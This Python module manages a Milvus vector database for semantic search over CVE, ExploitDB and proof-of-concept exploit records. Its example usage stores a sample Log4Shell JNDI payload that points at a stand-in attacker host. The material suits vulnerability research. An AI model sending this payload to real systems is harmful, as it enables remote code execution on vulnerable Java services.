"""
Knowledge Matrix - Vector Database Manager

This module manages the vector database (Milvus) for semantic search of:
- CVE (Common Vulnerabilities and Exposures) database
- ExploitDB archives
- GitHub PoC (Proof of Concept) repositories
- Historical attack patterns and payloads

Architecture:
- Embeddings: OpenAI text-embedding-3-large (3072 dimensions)
- Fallback: sentence-transformers/all-MiniLM-L6-v2 (384 dimensions)
- Index: HNSW (Hierarchical Navigable Small World) for fast ANN search
"""

import os
import logging
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from datetime import datetime

from pymilvus import (
    connections,
    Collection,
    CollectionSchema,
    FieldSchema,
    DataType,
    utility,
)
import numpy as np
from sentence_transformers import SentenceTransformer
import openai

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass
class ExploitDocument:
    """Represents an exploit/vulnerability document"""
    id: str
    title: str
    description: str
    cve_id: Optional[str]
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    exploit_code: Optional[str]
    source: str  # ExploitDB, GitHub, NVD, etc.
    tags: List[str]
    created_at: datetime
    embedding: Optional[List[float]] = None


class VectorDBManager:
    """Manages Milvus vector database operations"""
    
    COLLECTION_NAME = "exploit_knowledge_base"
    EMBEDDING_DIM = 384  # MiniLM dimension (change to 3072 for OpenAI)
    
    def __init__(
        self,
        host: str = "localhost",
        port: int = 19530,
        use_openai: bool = False
    ):
        self.host = host
        self.port = port
        self.use_openai = use_openai
        
        # Initialize embedding model
        if use_openai and os.getenv("OPENAI_API_KEY"):
            self.embedder = "openai"
            openai.api_key = os.getenv("OPENAI_API_KEY")
            self.EMBEDDING_DIM = 3072
            logger.info("Using OpenAI embeddings (3072-dim)")
        else:
            self.embedder = SentenceTransformer('all-MiniLM-L6-v2')
            self.EMBEDDING_DIM = 384
            logger.info("Using SentenceTransformer embeddings (384-dim)")
        
        self._connect()
        self._create_collection()
    
    def _connect(self):
        """Establish connection to Milvus"""
        try:
            connections.connect(
                alias="default",
                host=self.host,
                port=self.port
            )
            logger.info(f"Connected to Milvus at {self.host}:{self.port}")
        except Exception as e:
            logger.error(f"Failed to connect to Milvus: {e}")
            raise
    
    def _create_collection(self):
        """Create collection schema if not exists"""
        if utility.has_collection(self.COLLECTION_NAME):
            logger.info(f"Collection '{self.COLLECTION_NAME}' already exists")
            self.collection = Collection(self.COLLECTION_NAME)
            return
        
        # Define schema
        fields = [
            FieldSchema(name="id", dtype=DataType.VARCHAR, is_primary=True, max_length=100),
            FieldSchema(name="title", dtype=DataType.VARCHAR, max_length=500),
            FieldSchema(name="description", dtype=DataType.VARCHAR, max_length=5000),
            FieldSchema(name="cve_id", dtype=DataType.VARCHAR, max_length=50),
            FieldSchema(name="severity", dtype=DataType.VARCHAR, max_length=20),
            FieldSchema(name="source", dtype=DataType.VARCHAR, max_length=100),
            FieldSchema(name="tags", dtype=DataType.VARCHAR, max_length=1000),  # JSON string
            FieldSchema(name="created_at", dtype=DataType.INT64),  # Unix timestamp
            FieldSchema(name="embedding", dtype=DataType.FLOAT_VECTOR, dim=self.EMBEDDING_DIM)
        ]
        
        schema = CollectionSchema(
            fields=fields,
            description="Exploit and vulnerability knowledge base"
        )
        
        self.collection = Collection(
            name=self.COLLECTION_NAME,
            schema=schema
        )
        
        # Create HNSW index for fast similarity search
        index_params = {
            "metric_type": "COSINE",  # Cosine similarity
            "index_type": "HNSW",
            "params": {"M": 16, "efConstruction": 200}
        }
        
        self.collection.create_index(
            field_name="embedding",
            index_params=index_params
        )
        
        logger.info(f"Created collection '{self.COLLECTION_NAME}' with HNSW index")
    
    def generate_embedding(self, text: str) -> List[float]:
        """Generate embedding for text"""
        try:
            if self.embedder == "openai":
                response = openai.embeddings.create(
                    model="text-embedding-3-large",
                    input=text
                )
                return response.data[0].embedding
            else:
                embedding = self.embedder.encode(text, convert_to_numpy=True)
                return embedding.tolist()
        except Exception as e:
            logger.error(f"Embedding generation failed: {e}")
            raise
    
    def insert_documents(self, documents: List[ExploitDocument]) -> bool:
        """Insert exploit documents into vector DB"""
        try:
            # Prepare data
            data = []
            for doc in documents:
                # Generate embedding if not provided
                if doc.embedding is None:
                    combined_text = f"{doc.title} {doc.description}"
                    doc.embedding = self.generate_embedding(combined_text)
                
                data.append({
                    "id": doc.id,
                    "title": doc.title,
                    "description": doc.description,
                    "cve_id": doc.cve_id or "N/A",
                    "severity": doc.severity,
                    "source": doc.source,
                    "tags": ",".join(doc.tags),
                    "created_at": int(doc.created_at.timestamp()),
                    "embedding": doc.embedding
                })
            
            # Insert into collection
            self.collection.insert(data)
            self.collection.flush()
            
            logger.info(f"Inserted {len(documents)} documents")
            return True
            
        except Exception as e:
            logger.error(f"Insert failed: {e}")
            return False
    
    def search(
        self,
        query: str,
        top_k: int = 5,
        severity_filter: Optional[str] = None
    ) -> List[Dict[str, Any]]:
        """
        Semantic search for exploits
        
        Args:
            query: Natural language query (e.g., "Apache 2.4 remote code execution")
            top_k: Number of results to return
            severity_filter: Filter by severity (CRITICAL, HIGH, etc.)
        
        Returns:
            List of matching documents with similarity scores
        """
        try:
            # Generate query embedding
            query_embedding = self.generate_embedding(query)
            
            # Load collection to memory
            self.collection.load()
            
            # Build search expression
            search_params = {"metric_type": "COSINE", "params": {"ef": 64}}
            expr = None
            if severity_filter:
                expr = f'severity == "{severity_filter}"'
            
            # Execute search
            results = self.collection.search(
                data=[query_embedding],
                anns_field="embedding",
                param=search_params,
                limit=top_k,
                expr=expr,
                output_fields=["id", "title", "description", "cve_id", "severity", "source", "tags"]
            )
            
            # Format results
            formatted_results = []
            for hits in results:
                for hit in hits:
                    formatted_results.append({
                        "id": hit.entity.get("id"),
                        "title": hit.entity.get("title"),
                        "description": hit.entity.get("description"),
                        "cve_id": hit.entity.get("cve_id"),
                        "severity": hit.entity.get("severity"),
                        "source": hit.entity.get("source"),
                        "tags": hit.entity.get("tags").split(","),
                        "similarity_score": hit.score
                    })
            
            return formatted_results
            
        except Exception as e:
            logger.error(f"Search failed: {e}")
            return []
    
    def get_collection_stats(self) -> Dict[str, Any]:
        """Get collection statistics"""
        self.collection.load()
        return {
            "name": self.COLLECTION_NAME,
            "num_entities": self.collection.num_entities,
            "schema": str(self.collection.schema),
            "indexes": [str(idx) for idx in self.collection.indexes]
        }
    
    def close(self):
        """Close connection"""
        connections.disconnect("default")
        logger.info("Disconnected from Milvus")


# Example usage
if __name__ == "__main__":
    # Initialize
    db = VectorDBManager(host="localhost", port=19530)
    
    # Insert sample data
    sample_docs = [
        ExploitDocument(
            id="CVE-2021-44228",
            title="Apache Log4j2 Remote Code Execution (Log4Shell)",
            description="A critical vulnerability in Apache Log4j2 allows remote code execution via JNDI lookup",
            cve_id="CVE-2021-44228",
            severity="CRITICAL",
            exploit_code="${jndi:ldap://attacker.com/a}",
            source="NVD",
            tags=["RCE", "Java", "Apache", "Log4j"],
            created_at=datetime.now()
        )
    ]
    
    db.insert_documents(sample_docs)
    
    # Search
    results = db.search("Java logging vulnerability", top_k=3)
    for result in results:
        print(f"\n{result['title']} (Score: {result['similarity_score']:.3f})")
        print(f"CVE: {result['cve_id']} | Severity: {result['severity']}")
    
    # Stats
    print("\n", db.get_collection_stats())
    
    db.close()
